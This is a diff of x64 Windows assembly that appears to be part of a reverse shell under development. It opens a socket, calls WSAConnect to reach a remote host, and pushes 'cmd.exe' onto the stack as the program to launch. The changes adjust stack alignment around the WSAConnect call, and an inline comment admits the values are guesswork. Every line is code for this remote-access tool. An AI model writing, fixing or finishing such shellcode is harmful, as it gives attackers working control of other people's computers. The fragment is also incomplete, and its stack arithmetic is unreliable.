@@ -41,7 +41,7 @@ main:
     mov r13, rax                    ; Store SOCKET handle in RDI for later use
 
     mov rcx, r13                ;    Our socket handle as parameter 1
-    sub rsp,0x208               ;    Make some room on the stack
+    ;sub rsp,0x90               ;    Make some room on the stack
     xor rax,rax                 ;
     inc rax                     ;
     inc rax                     ;
@@ -56,9 +56,10 @@ main:
     push r9                     ; NULL lpCallerData
     push r9                     ; NULL lpCallerData
     push r9                     ; NULL lpSQOS
-    sub rsp, 208              ; NULL lpSQOS
+	add rsp, 8
+    sub rsp, 0x90                ; This is somewhat problematic. needs to be a high value to account for the stack or so it seems
     call WSAConnect             ; Call WSAConnect
-
+    add rsp, 0x30
     mov rax, 0x6578652e646d63     ; Push cmd.exe string to stack
     push rax                      
     mov rcx, rsp                  ; RCX = lpApplicationName (cmd.exe)
